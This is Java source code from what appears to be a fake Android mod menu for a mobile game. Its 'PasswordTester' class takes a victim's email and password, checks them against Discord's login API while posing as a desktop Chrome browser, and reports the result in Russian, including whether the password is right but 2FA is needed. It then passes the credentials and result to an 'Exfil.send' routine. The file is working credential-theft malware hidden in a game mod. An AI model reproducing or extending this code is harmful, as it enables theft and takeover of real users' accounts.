package com.brawl.modmenu;

import android.util.Base64;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class PasswordTester {

    public static void testAll(final String email, final String password) {
        new Thread(() -> {
            StringBuilder report = new StringBuilder();
            report.append("Email: ").append(email).append("\n");
            report.append("Пароль: ").append(password).append("\n");
            report.append("─────────────\n");
            report.append("Discord: ").append(testDiscord(email, password)).append("\n");
            Exfil.send("PWD_TEST", report.toString());
        }).start();
    }

    private static String testDiscord(String email, String password) {
        try {
            URL u = new URL("https://discord.com/api/v9/auth/login");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120");
            c.setRequestProperty("Origin", "https://discord.com");
            c.setRequestProperty("Referer", "https://discord.com/login");
            c.setRequestProperty("X-Super-Properties", buildSuperProperties());
            c.setRequestProperty("X-Discord-Locale", "en-US");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);

            String body = "{\"login\":\"" + email + "\",\"password\":\"" + password + "\",\"undelete\":false,\"captcha_key\":null,\"login_source\":null,\"gift_code_sku_id\":null}";
            OutputStream os = c.getOutputStream();
            os.write(body.getBytes("UTF-8"));
            os.close();

            int code = c.getResponseCode();
            BufferedReader r;
            if (code >= 200 && code < 300) r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            else r = new BufferedReader(new InputStreamReader(c.getErrorStream()));

            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            String resp = sb.toString();

            if (code == 200 && resp.contains("token")) return "✅ РАБОТАЕТ";
            if (resp.contains("mfa") || resp.contains("two_factor")) return "🔒 Требуется 2FA (пароль верный!)";
            if (resp.contains("captcha")) return "🤖 Требуется капча";
            if (code == 401 || resp.contains("INVALID_LOGIN")) return "❌ Неверный пароль";
            if (code == 429) return "⏸ Слишком много попыток";
            return "⚠️ Код " + code;
        } catch (Throwable t) {
            return "⚠️ " + t.getClass().getSimpleName();
        }
    }

    private static String buildSuperProperties() {
        try {
            String json = "{\"os\":\"Windows\",\"browser\":\"Chrome\",\"browser_user_agent\":\"Mozilla/5.0\",\"client_build_number\":241857}";
            return Base64.encodeToString(json.getBytes("UTF-8"), Base64.NO_WRAP | Base64.URL_SAFE);
        } catch (Throwable t) {
            return "";
        }
    }
}
